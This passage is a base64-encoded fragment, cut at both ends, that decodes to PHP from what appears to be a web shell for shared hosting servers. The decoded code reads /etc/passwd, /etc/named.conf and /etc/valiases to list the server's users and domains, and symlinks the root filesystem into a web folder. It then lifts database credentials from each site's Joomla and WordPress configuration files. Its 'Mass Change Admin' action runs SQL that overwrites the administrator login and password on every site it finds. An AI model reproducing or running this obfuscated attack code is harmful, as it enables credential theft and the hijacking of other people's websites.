F0Y2hfYWxsKCcjem9uZSAiKC4qKSIjJywgJGRvbSwgJGRvbXN3cyk7DQoNCmZsdXNoKCk7DQoNCmlmKHN0cmxlbih0cmltKCRkb21zd3NbMV1bMF0pKSA+IDIpew0KDQokdXNlciA9IHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoIi9ldGMvdmFsaWFzZXMvIi4kZG9tc3dzWzFdWzBdKSk7DQoNCmZsdXNoKCk7DQoNCg0KDQokc2l0ZSA9ICR1c2VyWyduYW1lJ10gOw0KDQoNCkBzeW1saW5rKCIvIiwic3ltL3Jvb3QiKTsNCg0KJHNpdGUgPSAkZG9tc3dzWzFdWzBdOw0KDQokaXIgPSAnaXInOw0KDQokaWwgPSAnaWwnOw0KDQppZiAocHJlZ19tYXRjaCgiLy5eJGlyLyIsJGRvbXN3c1sxXVswXSkgb3IgcHJlZ19tYXRjaCgiLy5eJGlsLyIsJGRvbXN3c1sxXVswXSkgKQ0Kew0KJHNpdGUgPSAiPGRpdiBzdHlsZT0nIGNvbG9yOiAjRkYwMDAwIDsgdGV4dC1zaGFkb3c6IDBweCAwcHggMXB4IHJlZDsgJz4iLiRkb21zd3NbMV1bMF0uIjwvZGl2PiI7DQp9DQoNCg0KZWNobyAiDQo8dHI+DQoNCjx0ZD4NCjxkaXYgY2xhc3M9J2RvbSc+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9aHR0cDovL3d3dy4iLiRkb21zd3NbMV1bMF0uIi8+Ii4kc2l0ZS4iIDwvYT4gPC9kaXY+DQo8L3RkPg0KDQoNCjx0ZD4NCiIuJHVzZXJbJ25hbWUnXS4iDQo8L3RkPg0KDQoNCg0KDQoNCg0KPHRkPg0KPGEgaHJlZj0nc3ltL3Jvb3QvaG9tZS8iLiR1c2VyWyduYW1lJ10uIi9wdWJsaWNfaHRtbCcgdGFyZ2V0PSdfYmxhbmsnPnN5bWxpbmsgPC9hPg0KPC90ZD4NCg0KDQo8L3RyPjwvZGl2PiAiOw0KDQoNCmZsdXNoKCk7DQpmbHVzaCgpOw0KDQp9DQp9DQp9DQp9DQoNCg0KDQoNCmJyZWFrOw0KDQoNCi8vLyBmaWxlICBzeW1saW5rIC8vLw0KDQpjYXNlICdmaWxlJzoNCg0KZWNobycNClRoZSBmaWxlIHBhdGggdG8gc3ltbGluaw0KDQo8YnIgLz48YnIgLz4NCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgdmFsdWU9Ii9ob21lL3VzZXIvcHVibGljX2h0bWwvZmlsZS5uYW1lIiBzaXplPSI2MCIvPjxiciAvPjxiciAvPg0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InN5bWZpbGUiIHZhbHVlPSJmaWxlLm5hbWVfc3ltICggRXguIDo6IHJveWFsaXN0ZS50eHQgKSIgc2l6ZT0iNjAiLz48YnIgLz48YnIgLz4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzeW1saW5rIiBuYW1lPSJzeW1saW5rIiAvPiA8YnIgLz48YnIgLz4NCg0KDQoNCjwvZm9ybT4NCic7DQoNCiRwZmlsZSA9ICRfUE9TVFsnZmlsZSddOw0KJHN5bWZpbGUgPSAkX1BPU1RbJ3N5bWZpbGUnXTsNCiRzeW1saW5rID0gJF9QT1NUWydzeW1saW5rJ107DQoNCmlmICgkc3ltbGluaykNCnsNCg0KDQpAbWtkaXIoJ3N5bTEnLDA3NzcpOw0KJGMgID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBcbiBEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtIFxuIEFkZFR5cGUgdHh0IC5waHAgXG4gQWRkSGFuZGxlciB0eHQgLnBocCBcbiAgQWRkVHlwZSB0eHQgLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gT3B0aW9ucyBhbGwgXG4gT3B0aW9ucyBcbiBBbGxvdyBmcm9tIGFsbCBcbiBSZXF1aXJlIE5vbmUgXG4gU2F0aXNmeSBBbnkiOw0KJGYgPUBmb3BlbiAoJ3N5bTEvLmh0YWNjZXNzJywndycpOw0KQGZ3cml0ZSgkZiAsICRjKTsNCg0KQHN5bWxpbmsoIiRwZmlsZSIsInN5bTEvJHN5bWZpbGUiKTsNCg0KZWNobyAnPGJyIC8+PGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9InN5bTEvJy4kc3ltZmlsZS4nIiA+Jy4kc3ltZmlsZS4nPC9hPic7DQoNCn0NCg0KDQoNCmJyZWFrOw0KDQovLy8gYnlwYXNzIHJlYWQNCg0KY2FzZSAncmVhZCc6DQoNCmVjaG8gInJlYWQgL2V0Yy9uYW1lZC5jb25mIjsNCmVjaG8gIjxiciAvPjxiciAvPjxmb3JtIG1ldGhvZD0ncG9zdCcgYWN0aW9uPSc/c3dzPXJlYWQmc2F2ZT0xJz48dGV4dGFyZWEgY29scz0nODAnIHJvd3M9JzIwJyBuYW1lPSdmaWxlJz4iOw0KZmx1c2goKTsNCmZsdXNoKCk7DQoNCg0KJGZpbGUgPSAnL2V0Yy9uYW1lZC5jb25mJzsNCg0KDQokcjNhZCA9IEBmb3BlbigkZmlsZSwgJ3InKTsNCmlmICgkcjNhZCl7DQokY29udGVudCA9IEBmcmVhZCgkcjNhZCwgQGZpbGVzaXplKCRmaWxlKSk7DQplY2hvICIiLmh0bWxlbnRpdGllcygkY29udGVudCkuIiI7DQp9DQplbHNlIGlmICghJHIzYWQpDQp7DQokcjNhZCA9IEBzaG93X3NvdXJjZSgkZmlsZSkgOw0KfQ0KZWxzZSBpZiAoISRyM2FkKQ0Kew0KJHIzYWQgPSBAaGlnaGxpZ2h0X2ZpbGUoJGZpbGUpOw0KfQ0KZWxzZSBpZiAoISRyM2FkKQ0Kew0KJHNtID0gQHN5bWxpbmsoJGZpbGUsJ3N5bS50eHQnKTsNCg0KDQppZiAoJHNtKXsNCiRyM2FkID0gQGZvcGVuKCdzeW0vc3ltLnR4dCcsICdyJyk7DQokY29udGVudCA9IEBmcmVhZCgkcjNhZCwgQGZpbGVzaXplKCRmaWxlKSk7DQplY2hvICIiLmh0bWxlbnRpdGllcygkY29udGVudCkuIiI7DQoNCn0NCn0NCg0KDQoNCmVjaG8gIjwvdGV4dGFyZWE+PGJyIC8+PGJyIC8+PGlucHV0ICB0eXBlPSdzdWJtaXQnIHZhbHVlPSdTYXZlJy8+IDwvZm9ybT4iOw0KDQoNCmlmKGlzc2V0KCRfR0VUWydzYXZlJ10pKXsNCg0KDQokY29udCA9IHN0cmlwY3NsYXNoZXMoJF9QT1NUWydmaWxlJ10pOw0KDQokZiA9IGZvcGVuKCduYW1lZC50eHQnLCd3Jyk7DQoNCiR3ID0gZndyaXRlKCRmLCRjb250KTsNCg0KICAgICAgICAgICAgICAgICBpZigkdyl7DQoNCiAgICAgICAgICAgICAgICAgZWNobyAnPGJyIC8+c2F2ZSBoYXMgYmVlbiBzdWNjZXNzZnVsbHknOw0KDQogICAgICAgICAgICAgICAgIH0NCg0KZmNsb3NlKCRmKTsNCg0KDQoNCg0KfQ0KDQoNCg0KYnJlYWs7DQoNCi8vIHBhc3N3ZA0KDQpjYXNlICdwYXNzd2QnOg0KDQppZihpc3NldCgkX0dFVFsnc2F2ZSddKSBhbmQgaXNzZXQoJF9QT1NUWydmaWxlJ10pIG9yIEBmaWxlc2l6ZSgncGFzc3dkLnR4dCcpID4gMCl7DQoNCg0KJGNvbnQgPSBzdHJpcGNzbGFzaGVzKCRfUE9TVFsnZmlsZSddKTsNCg0KaWYoIWZpbGVfZXhpc3RzKCdwYXNzd2QudHh0Jykpew0KDQokZiA9IEBmb3BlbigncGFzc3dkLnR4dCcsJ3cnKTsNCg0KJHcgPSBAZndyaXRlKCRmLCRjb250KTsNCg0KZmNsb3NlKCRmKTsNCn0NCmlmKCR3IG9yIEBmaWxlc2l6ZSgncGFzc3dkLnR4dCcpID4gMCl7DQovLyAqIFNIT1cgKiAvLw0KDQplY2hvICI8ZGl2IGNsYXNzPSd0bXAnPjx0YWJsZSBhbGlnbj0nY2VudGVyJyB3aWR0aD0nMzUlJz48dGQ+VXNlcnM8L3RkPjx0ZD5zeW1saW5rPC90ZD48dGQ+RlRQPC90ZD4iOw0KZmx1c2goKTsNCg0KJGZpbDMgPSBmaWxlKCdwYXNzd2QudHh0Jyk7DQoNCmZvcmVhY2ggKCRmaWwzIGFzICRmKXsNCg0KICAgICR1PWV4cGxvZGUoJzonLCAkZik7DQogICAgJHVzZXIgPSAkdVsnMCddOw0KDQoNCg0KZWNobyAiDQo8dHI+DQoNCg0KDQo8dGQgd2lkdGg9JzE1JSc+DQokdXNlcg0KPC90ZD4NCg0KDQoNCg0KDQoNCjx0ZCB3aWR0aD0nMTAlJz4NCjxhIGhyZWY9J3N5bS9yb290L2hvbWUvJHVzZXIvcHVibGljX2h0bWwnIHRhcmdldD0nX2JsYW5rJz5TeW1saW5rIDwvYT4NCjwvdGQ+DQoNCjx0ZCB3aWR0aD0nMTAlJz4NCjxhIGhyZWY9JyRwYWdlRlRQL3N5bS9yb290L2hvbWUvJHVzZXIvcHVibGljX2h0bWwnIHRhcmdldD0nX2JsYW5rJz5GVFA8L2E+DQo8L3RkPg0KDQoNCg0KPC90cj48L2Rpdj4gIjsNCg0KDQpmbHVzaCgpOw0KZmx1c2goKTsNCg0KDQp9DQoNCg0KDQoNCg0KDQpkaWUgKCI8L3RyPjwvZGl2PiIpOw0KDQoNCiAgICAgICAgICAgICAgICAgfQ0KDQoNCg0KDQoNCn0NCg0KDQoNCmVjaG8gInJlYWQgL2V0Yy9wYXNzd2QiOw0KZWNobyAiPGJyIC8+PGJyIC8+PGZvcm0gbWV0aG9kPSdwb3N0JyBhY3Rpb249Jz9zd3M9cGFzc3dkJnNhdmU9MSc+PHRleHRhcmVhIGNvbHM9JzgwJyByb3dzPScyMCcgbmFtZT0nZmlsZSc+IjsNCmZsdXNoKCk7DQoNCiRmaWxlID0gJy9ldGMvcGFzc3dkJzsNCg0KDQokcjNhZCA9IEBmb3BlbigkZmlsZSwgJ3InKTsNCmlmICgkcjNhZCl7DQokY29udGVudCA9IEBmcmVhZCgkcjNhZCwgQGZpbGVzaXplKCRmaWxlKSk7DQplY2hvICIiLmh0bWxlbnRpdGllcygkY29udGVudCkuIiI7DQp9DQplbHNlaWYoISRyM2FkKQ0Kew0KJHIzYWQgPSBAc2hvd19zb3VyY2UoJGZpbGUpIDsNCn0NCmVsc2VpZighJHIzYWQpDQp7DQokcjNhZCA9IEBoaWdobGlnaHRfZmlsZSgkZmlsZSk7DQp9DQplbHNlaWYoISRyM2FkKQ0Kew0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCR1aWQ9MDskdWlkPDEwMDA7JHVpZCsrKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGFyYSA9IHBvc2l4X2dldHB3dWlkKCR1aWQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGFyYSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAobGlzdCAoJGtleSwgJHZhbCkgPSBlYWNoKCRhcmEpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICIkdmFsOiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KfQ0KDQoNCmZsdXNoKCk7DQoNCg0KZWNobyAiPC90ZXh0YXJlYT48YnIgLz48YnIgLz48aW5wdXQgIHR5cGU9J3N1Ym1pdCcgdmFsdWU9JyZuYnNwOyZuYnNwO3N5bWxpbmsmbmJzcDsmbmJzcDsnLz4gPC9mb3JtPiI7DQpmbHVzaCgpOw0KDQpicmVhazsNCg0KDQoNCmNhc2UgJ2pvb21sYSc6DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8geHh4eHh4eHh4eHh4eHh4eHh4eCAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQoNCg0KaWYoaXNzZXQoJF9QT1NUWydzJ10pKXsNCg0KJGZpbGUgPSBAZmlsZV9nZXRfY29udGVudHMoJ2pvb21sYS50eHQnKTsNCg0KJGV4ICAgPSBleHBsb2RlKCJcbiIsJGZpbGUpOw0KDQplY2hvICI8ZGl2IGNsYXNzPSd0bXAnPjx0YWJsZSBhbGlnbj0nY2VudGVyJyB3aWR0aD0nNDAlJz48dGQ+IGRvbWluIDwvdGQ+PHRkPiBjb25maWcgPC90ZD48dGQ+IFJlc3VsdCA8L3RkPiI7DQpmbHVzaCgpOw0KDQoNCmZvcmVhY2ggKCRleCBhcyAkZXhwKXsNCg0KJGVzICAgPSBleHBsb2RlKCJ8fCIsJGV4cCk7DQoNCiRjb25maWcgPSAkZXNbMF07DQoNCiRkb21pbiA9ICRlc1sxXTsNCg0KJGRvbWlucyA9IHRyaW0oJGRvbWluKS4nJzsNCg0KJHJlYWRjb25maWcgID0gQGZpbGVfZ2V0X2NvbnRlbnRzKHRyaW0oJGNvbmZpZykpOw0KDQppZihlcmVnKCdKQ29uZmlnJywkcmVhZGNvbmZpZykpew0KDQoNCg0KJHBhc3MgICAgPSAgZXgoJHJlYWRjb25maWcsJyRwYXNzd29yZCA9IFwnJywiJzsiKTsNCg0KJHVzZXJkYiAgPSAgZXgoJHJlYWRjb25maWcsJyR1c2VyID0gXCcnLCInOyIpOw0KDQokZGIgICAgICA9ICBleCgkcmVhZGNvbmZpZywnJGRiID0gXCcnLCInOyIpOw0KDQokZml4ICAgICA9ICBleCgkcmVhZGNvbmZpZywnJGRicHJlZml4ID0gXCcnLCInOyIpOw0KDQokdGFiICAgICA9ICAkZml4Lid1c2Vycyc7DQoNCg0KJGNvbiAgICAgPSBAbXlzcWxfY29ubmVjdCgnbG9jYWxob3N0JywkdXNlcmRiLCRwYXNzKTsNCg0KJGRiICAgICAgPSBAbXlzcWxfc2VsZWN0X2RiKCRkYiwkY29uKTsNCg0KJHF1ZXJ5ICAgPSBAbXlzcWxfcXVlcnkoIlVQREFURSBgJHRhYmAgIFNFVCBgdXNlcm5hbWVgID0nYWRtaW4nIik7DQoNCg0KJHF1ZXJ5MyAgPSBAbXlzcWxfcXVlcnkoIlVQREFURSBgJHRhYmAgIFNFVCBgcGFzc3dvcmRgID0nOWNkZmI0MzljNzg3NmU3MDNlMzA3ODY0YzkxNjdhMTUnIik7DQoNCg0KaWYgKCRxdWVyeSBhbmQgJHF1ZXJ5MyApeyRyID0gJzxiIHN0eWxlPSJjb2xvcjogIzAwNjYwMCI+U3VjY2VlZCA8L2I+dXNlciBbYWRtaW5dIHBhc3MgW2xvbF08L2I+Jzt9ZWxzZXskciA9ICc8YiBzdHlsZT0iY29sb3I6cmVkIj5mYWlsZWQ8L2I+Jzt9DQoNCiRkb21pbnMgPSB0cmltKCRkb21pbikuJyc7DQoNCmVjaG8gIjx0cj4NCjx0ZD48YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0naHR0cDovLyRkb21pbnMnPiRkb21pbjwvYT48L3RkPg0KPHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSckY29uZmlnJz5jb25maWc8L2E+PC90ZD48dGQ+Ii4kci4iPC90ZD48L3RyPiI7DQpmbHVzaCgpOw0KDQoNCg0KfWVsc2V7DQoNCmVjaG8gIjx0cj4NCjx0ZD48YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0naHR0cDovLyRkb21pbnMnPiRkb21pbjwvYT48L3RkPg0KPHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdodHRwOi8vJGV4cCc+Y29uZmlnPC9hPjwvdGQ+PHRkPjxiIHN0eWxlPSdjb2xvcjpyZWQnPmZhaWxlZDwvYj48L3RkPjwvdHI+IjsNCmZsdXNoKCk7DQoNCn0NCg0KfQ0KDQoNCg0KDQoNCg0KDQoNCg0KZGllKCk7DQoNCn0NCg0KaWYoIWlzX2ZpbGUoJ25hbWVkLnR4dCcpKXsNCg0KJGQwMG0gPSBAZmlsZSgiL2V0Yy9uYW1lZC5jb25mIik7DQoNCmZsdXNoKCk7DQoNCg0KfWVsc2V7DQoNCiRkMDBtID0gZmlsZSgibmFtZWQudHh0Iik7DQoNCg0KfQ0KaWYoISRkMDBtKQ0Kew0KDQogICAgICAgICAgICAgICBkaWUgKCI8bWV0YSBodHRwLWVxdWl2PSdyZWZyZXNoJyBjb250ZW50PScwOyB1cmw9P3N3cz1yZWFkJy8+Iik7DQp9DQplbHNlDQoNCnsNCmVjaG8gIjxkaXYgY2xhc3M9J3RtcCc+DQo8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJHBnP3N3cz1qb29tbGEnPg0KPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J01hc3MgY2hpbmcgQWRtaW4nIC8+DQo8aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nMScgbmFtZT0ncycgLz4NCjwvZm9ybT48YnIgLz48YnIgLz4NCjx0YWJsZSBhbGlnbj0nY2VudGVyJyB3aWR0aD0nNDAlJz48dGQ+IERvbWFpbnMgPC90ZD48dGQ+IGNvbmZpZyA8L3RkPjx0ZD4gUmVzdWx0IDwvdGQ+IjsNCg0KJGYgPSBmb3Blbignam9vbWxhLnR4dCcsJ3cnKTsNCg0KZm9yZWFjaCgkZDAwbSBhcyAkZG9tKXsNCg0KaWYoZXJlZ2koInpvbmUiLCRkb20pKXsNCg0KcHJlZ19tYXRjaF9hbGwoJyN6b25lICIoLiopIiMnLCAkZG9tLCAkZG9tc3dzKTsNCg0KaWYoc3RybGVuKHRyaW0oJGRvbXN3c1sxXVswXSkpID4gMil7DQoNCiR1c2VyID0gcG9zaXhfZ2V0cHd1aWQoQGZpbGVvd25lcigiL2V0Yy92YWxpYXNlcy8iLiRkb21zd3NbMV1bMF0pKTsNCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KJHdwbD0kcGFnZVVSTC4iL3N5bS9yb290L2hvbWUvIi4kdXNlclsnbmFtZSddLiIvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAiOw0KJHdwcD1nZXRfaGVhZGVycygkd3BsKTsNCiR3cD0kd3BwWzBdOw0KDQokd3AyPSRwYWdlVVJMLiIvc3ltL3Jvb3QvaG9tZS8iLiR1c2VyWyduYW1lJ10uIi9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwIjsNCiR3cHAyPWdldF9oZWFkZXJzKCR3cDIpOw0KJHdwMTI9JHdwcDJbMF07DQoNCiR3cDM9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4iL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCI7DQokd3BwMz1nZXRfaGVhZGVycygkd3AzKTsNCiR3cDEzPSR3cHAzWzBdOw0KDQoNCi8vLy8vLy8vLy8gam9vbWxhIC8vLy8vLy8vLy8vLw0KDQokcG9zID0gc3RycG9zKCR3cCwgIjIwMCIpOw0KJGNvbmZpZz0iJm5ic3A7IjsNCg0KaWYgKHN0cnBvcygkd3AsICIyMDAiKSA9PSB0cnVlICkNCnsNCiRjb25maWc9ICR3cGw7DQp9DQplbHNlaWYgKHN0cnBvcygkd3AxMiwgIjIwMCIpID09IHRydWUpDQp7DQogJGNvbmZpZz0gJHdwMjsNCn0NCmVsc2VpZiAoc3RycG9zKCR3cDEzLCAiMjAwIikgPT0gdHJ1ZSkNCnsNCiAkY29uZmlnPSAkd3AzOw0KfQ0KZWxzZQ0Kew0KY29udGludWU7DQoNCn0NCmZsdXNoKCk7DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KJGRvbSA9ICRkb21zd3NbMV1bMF07DQoNCiR3ID0gZndyaXRlKCRmLCIkY29uZmlnfHwkZG9tIFxuIik7DQppZigkdyl7JHIgPSAnPGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TYXZlPC9iPic7fWVsc2V7JHIgPSAnPGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPic7fQ0KDQoNCmVjaG8gIjx0cj48dGQ+PGEgaHJlZj1odHRwOi8vd3d3LiIuJGRvbXN3c1sxXVswXS4iPiIuJGRvbXN3c1sxXVswXS4iPC9hPjwvdGQ+DQo8dGQ+PGEgaHJlZj0nJGNvbmZpZyc+Y29uZmlnPC9hPjwvdGQ+PHRkPiIuJHIuIjwvdGQ+PC90cj4iOw0KDQoNCg0KDQoNCmZsdXNoKCk7DQoNCg0KfQ0KfQ0KfQ0KfQ0KDQoNCmJyZWFrOw0KDQpjYXNlICd3cCc6DQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgaW5kZXggIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIzMNCg0KDQoNCg0KDQoNCiMjIyMjIyMjICBhZG1pbiAjIyMjIyMjIyMjMzMNCg0KaWYoaXNzZXQoJF9QT1NUWydzJ10pKXsNCg0KJGZpbGUgPSBAZmlsZV9nZXRfY29udGVudHMoJ3dwLnR4dCcpOw0KDQokZXggICA9IGV4cGxvZGUoIlxuIiwkZmlsZSk7DQoNCmVjaG8gIjxkaXYgY2xhc3M9J3RtcCc+PHRhYmxlIGFsaWduPSdjZW50ZXInIHdpZHRoPSc0MCUnPjx0ZD4gZG9taW4gPC90ZD48dGQ+IGNvbmZpZyA8L3RkPjx0ZD4gUmVzdWx0IDwvdGQ+IjsNCmZsdXNoKCk7DQpmbHVzaCgpOw0KDQoNCmZvcmVhY2ggKCRleCBhcyAkZXhwKXsNCg0KJGVzICAgPSBleHBsb2RlKCJ8fCIsJGV4cCk7DQoNCiRjb25maWcgPSAkZXNbMF07DQoNCiRkb21pbiA9ICRlc1sxXTsNCg0KJGRvbWlucyA9IHRyaW0oJGRvbWluKS4nJzsNCg0KJHJlYWRjb25maWcgID0gQGZpbGVfZ2V0X2NvbnRlbnRzKHRyaW0oJGNvbmZpZykpOw0KDQppZihlcmVnKCd3cC1zZXR0aW5ncy5waHAnLCRyZWFkY29uZmlnKSl7DQoNCg0KDQokcGFzcyAgICA9ICBleCgkcmVhZGNvbmZpZywiZGVmaW5lKCdEQl9QQVNTV09SRCcsICciLCInKTsiKTsNCg0KJHVzZXJkYiAgPSAgZXgoJHJlYWRjb25maWcsImRlZmluZSgnREJfVVNFUicsICciLCInKTsiKTsNCg0KJGRiICAgICAgPSAgZXgoJHJlYWRjb25maWcsImRlZmluZSgnREJfTkFNRScsICciLCInKTsiKTsNCg0KJGZpeCAgICAgPSAgZXgoJHJlYWRjb25maWcsJyR0YWJsZV9wcmVmaXggID0gXCcnLCInOyIpOw0KDQokdGFiICAgICA9ICRmaXguJ3VzZXJzJzsNCg0KJGNvbiAgICAgPSBAbXlzcWxfY29ubmVjdCgnbG9jYWxob3N0JywkdXNlcmRiLCRwYXNzKTsNCg0KJGRiICAgICAgPSBAbXlzcWxfc2VsZWN0X2RiKCRkYiwkY29uKTsNCg0KJHF1ZXJ5ICAgPSBAbXlzcWxfcXVlcnkoIlVQREFURSBgJHRhYmAgU0VUIGB1c2VyX2xvZ2luYCA9J3NlYy13LmNvbSciKSBvciBkaWU7DQoNCiRxdWVyeSAgID0gQG15c3FsX3F1ZXJ5KCJVUERBVEUgYCR0YWJgIFNFVCBgdXNlcl9wYXNzYCA9JyQxJDR6Ly41aS4uJDlhSFlCLmZVSEVtTlouZUlLWVR3eC8nIikgb3IgZGllOw0KDQoNCg0KaWYgKCRxdWVyeSl7JHIgPSAnPGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TdWNjZWVkIDwvYj51c2VyIFtzZWMtdy5jb21dIHBhc3MgWzFdPC9iPic7fQ0KDQplbHNlDQoNCnsNCg0KJHIgPSAnPGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPic7DQoNCn0NCg0KJGRvbWlucyA9IHRyaW0oJGRvbWluKS4nJzsNCg0KZWNobyAiPHRyPg0KPHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdodHRwOi8vJGRvbWlucyc+JGRvbWluPC9hPjwvdGQ+DQo8dGQ+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9JyRjb25maWcnPmNvbmZpZzwvYT48L3RkPjx0ZD4iLiRyLiI8L3RkPjwvdHI+IjsNCg0KZmx1c2goKTsNCmZsdXNoKCk7DQoNCg0KDQoNCg0KDQp9ZWxzZXsNCg0KZWNobyAiPHRyPg0KPHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdodHRwOi8vJGRvbWlucyc+JGRvbWluPC9hPjwvdGQ+DQo8dGQ+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2h0dHA6Ly8kY29uZmlnJz5jb25maWc8L2E+PC90ZD48dGQ+PGIgc3R5bGU9J2NvbG9yOnJlZCc+ZmFpbGVkMjwvYj48L3RkPjwvdHI+IjsNCg0KZmx1c2goKTsNCmZsdXNoKCk7DQoNCn0NCg0KfQ0KDQoNCg0KDQoNCg0KDQoNCg0KDQpkaWUoKTsNCg0KfQ0KDQppZighaXNfZmlsZSgnbmFtZWQudHh0Jykpew0KDQokZDAwbSA9IEBmaWxlKCIvZXRjL25hbWVkLmNvbmYiKTsNCg0KfWVsc2V7DQoNCiRkMDBtID0gQGZpbGUoIm5hbWVkLnR4dCIpOw0KDQoNCn0NCmlmKCEkZDAwbSkNCnsNCg0KICAgICAgICAgICAgICAgZGllICgiPG1ldGEgaHR0cC1lcXVpdj0ncmVmcmVzaCcgY29udGVudD0nMDsgdXJsPT9zd3M9cmVhZCcvPiIpOw0KfQ0KZWxzZQ0KDQp7DQplY2hvICI8ZGl2IGNsYXNzPSd0bXAnPg0KPGZvcm0gbWV0aG9kPSdQT1NUJyBhY3Rpb249JyRwZz9zd3M9d3AnPg0KPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J01hc3MgQ2hhbmdlIEFkbWluJyAvPg0KPGlucHV0IHR5cGU9J2hpZGRlbicgdmFsdWU9JzEnIG5hbWU9J3MnIC8+DQo8L2Zvcm0+DQo8YnIgLz48YnIgLz4NCjx0YWJsZSBhbGlnbj0nY2VudGVyJyB3aWR0aD0nNDAlJz48dGQ+IERvbWFpbnMgPC90ZD48dGQ+IGNvbmZpZyA8L3RkPjx0ZD4gUmVzdWx0IDwvdGQ+IjsNCg0KZmx1c2goKTsNCmZsdXNoKCk7DQoNCiRmID0gZm9wZW4oJ3dwLnR4dCcsJ3cnKTsNCg0KZm9yZWFjaCgkZDAwbSBhcyAkZG9tKXsNCg0KaWYoZXJlZ2koInpvbmUiLCRkb20pKXsNCg0KcHJlZ19tYXRjaF9hbGwoJyN6b25lICIoLiopIiMnLCAkZG9tLCAkZG9tc3dzKTsNCg0KaWYoc3RybGVuKHRyaW0oJGRvbXN3c1sxXVswXSkpID4gMil7DQoNCiR1c2VyID0gcG9zaXhfZ2V0cHd1aWQoQGZpbGVvd25lcigiL2V0Yy92YWxpYXNlcy8iLiRkb21zd3NbMV1bMF0pKTsNCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KJHdwbD0kcGFnZVVSTC4iL3N5bS9yb290L2hvbWUvIi4kdXNlclsnbmFtZSddLiIvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCI7DQokd3BwPWdldF9oZWFkZXJzKCR3cGwpOw0KJHdwPSR3cHBbMF07DQoNCiR3cDI9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4iL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCI7DQokd3BwMj1nZXRfaGVhZGVycygkd3AyKTsNCiR3cDEyPSR3cHAyWzBdOw0KDQokd3AzPSRwYWdlVVJMLiIvc3ltL3Jvb3QvaG9tZS8iLiR1c2VyWyduYW1lJ10uIi9wdWJsaWNfaHRtbC93cC93cC1jb25maWciOw0KJHdwcDM9Z2V0X2hlYWRlcnMoJHdwMyk7DQokd3AxMz0kd3BwM1swXTsNCg0KDQovLy8vLy8vLy8vIHdwIC8vLy8vLy8vLy8vLw0KDQokcG9zID0gc3RycG9zKCR3cCwgIjIwMCIpOw0KJGNvbmZpZz0iJm5ic3A7IjsNCg0KaWYgKHN0cnBvcygkd3AsICIyMDAiKSA9PSB0cnVlICkNCnsNCiRjb25maWc9ICR3cGw7DQp9DQplbHNl